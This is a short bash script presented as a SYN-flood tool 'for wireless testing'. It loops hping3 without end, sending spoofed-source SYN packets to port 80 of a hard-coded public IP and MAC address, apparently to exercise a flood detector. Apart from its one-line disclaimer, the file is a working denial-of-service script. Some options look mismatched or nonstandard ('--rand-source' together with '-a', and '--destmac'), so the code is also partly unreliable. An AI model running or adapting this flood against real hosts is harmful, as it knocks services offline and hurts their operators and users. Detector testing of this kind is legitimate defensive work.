#!/bin/bash

# SYN Flood Script for wireless testing
# ⚠️ Educational/Testing Use Only!

TARGET_IP="103.211.18.5"  # Change to your target's IP on wireless
TARGET_PORT=80
TARGET_MAC="ba:1f:d8:1d:73:eb"  # Must match detector's TARGET_MAC

echo "[*] Starting wireless SYN flood to $TARGET_IP ($TARGET_MAC)..."

while true; do
    SPOOFED_IP="$(shuf -i 1-254 -n 4 | paste -sd.)"
    # Send with MAC address specification
    hping3 -S -p $TARGET_PORT -a $SPOOFED_IP $TARGET_IP -c 1 --rand-source --destmac $TARGET_MAC > /dev/null 2>&1
    echo "[+] Sent SYN from $SPOOFED_IP to $TARGET_MAC"
    sleep 0.01
done
